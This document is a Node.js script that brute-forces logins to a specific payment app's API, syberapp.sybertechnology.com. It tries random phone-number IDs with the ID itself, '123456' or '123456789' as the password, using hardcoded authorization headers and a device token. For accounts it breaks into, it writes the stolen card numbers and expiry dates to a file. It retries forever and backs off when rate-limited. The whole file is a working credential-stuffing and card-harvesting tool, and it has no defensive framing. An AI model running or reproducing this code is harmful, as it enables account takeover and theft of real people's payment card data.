const fetch = require('node-fetch');
const fs = require("fs");
i = 0;
function fish(){
var id = "012"+rand(7);
//var id = "0125113504"
var pass =id;
var status;
var info;
//console.log("trying"+ id+"|"+pass)
fetch('https://syberapp.sybertechnology.com/api/login', {
    method: 'POST',
    headers: {
        'Host': 'syberapp.sybertechnology.com',
        'authorization': 'xwrsy67Un9oshl8H=c5g',
        'accept': 'application/json',
        'version': '100',
        'content-type': 'application/json;charset=utf-8',
        
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.9.1'
    },
    body: JSON.stringify({
        'userIdentifier': id,
        'fireBaseToken': 'diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO',
        'password': pass
    })
}).then((response)=>{
status = response.status;
return response.text()
  
}).then((data)=>{
  i++;
  info = data;
  js = JSON.parse(data);
  //console.log(i)
  
  if(js.errorCode == 001){
  

fetch('https://syberapp.sybertechnology.com/api/login', {
    method: 'POST',
    headers: {
        'Host': 'syberapp.sybertechnology.com',
        'authorization': 'xwrsy67Un9oshl8H=c5g',
        'accept': 'application/json',
        'version': '100',
        'content-type': 'application/json;charset=utf-8',
        
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.9.1'
    },
    body: JSON.stringify({
        'userIdentifier': id,
        'fireBaseToken': 'diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO',
        'password':'123456'
    })
}).then((response)=>{
status = response.status;
return response.text()
  
}).then((data)=>{
  info = data;
    js = JSON.parse(data);
  if(js.errorCode == 001){


fetch('https://syberapp.sybertechnology.com/api/login', {
    method: 'POST',
    headers: {
        'Host': 'syberapp.sybertechnology.com',
        'authorization': 'xwrsy67Un9oshl8H=c5g',
        'accept': 'application/json',
        'version': '100',
        'content-type': 'application/json;charset=utf-8',
        
        'accept-encoding': 'gzip',
        'user-agent': 'okhttp/4.9.1'
    },
    body: JSON.stringify({
        'userIdentifier': id,
        'fireBaseToken': 'diehJic_R7qwLo0wDm71k1:APA91bHsL-ye5a69TZ94Pd6e2wRW_KcXlbXWawyyFbsGudgfv4mQ-8kbJnNllyLzm9_rbdHxUJngaspTtpQQqtgr8N1M8HGzYWAjeZQrtwn2dlINzrjJLtrVO6z_jrHTYyXrs_7mxefO',
        'password': '123456789'
    })
}).then((response)=>{
status = response.status;
return response.text()
  
}).then((data)=>{
  info = data;
  js = JSON.parse(data);
  if(js.errorCode == 001){
   fish()
  }else{
    var data = JSON.parse(data)
  fs.appendFile("123456789.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " 123456789");});
  var cards = data.cards;
  if(cards.length > 0){
data.cards.forEach((card)=>{
console.log(card.pan)
    fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
  }
fish();
  }
    
  }).catch((err)=>{
 console.log(" waiting 1 min "+i)
    i =0;
  setTimeout(function() {
    fish()
  }, 60000);
 // console.log("Timed out?"+status);
  //console.log(info)
})



  }else{
    var data = JSON.parse(data)
  fs.appendFile("123456.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " 123456");});
  var cards = data.cards;
  if(cards.length > 0){
data.cards.forEach((card)=>{
  console.log(card.pan)
    fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
  }
fish();
  }
    
  }).catch((err)=>{
  
 // console.log("Timed out?"+status);
  console.log(" waiting 1 min "+i)
    i =0;
  setTimeout(function() {
    fish()
  }, 60000);
  
})





  }else{
    var data = JSON.parse(data)
  fs.appendFile("numbers.txt",id+"\n",function (err) {if (err) throw err;console.log(id + " ID");});
  var cards = data.cards;
  if(cards.length > 0){
data.cards.forEach((card)=>{
  
console.log(card.pan)

    fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
  }
fish();
  }
  }).catch((err)=>{
    
   // var pos = err.search("token")
    console.log(" waiting 1 min "+i)
    i =0;
  setTimeout(function() {
    fish()
  }, 60000);
    
 // console.log("Timed out?"+status);
  //console.log(info)
})
}
fish()

function rand(length) {
    var result           = '';
    var characters       = '0123456789';
    var charactersLength = characters.length;
    for ( var i = 0; i < length; i++ ) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}
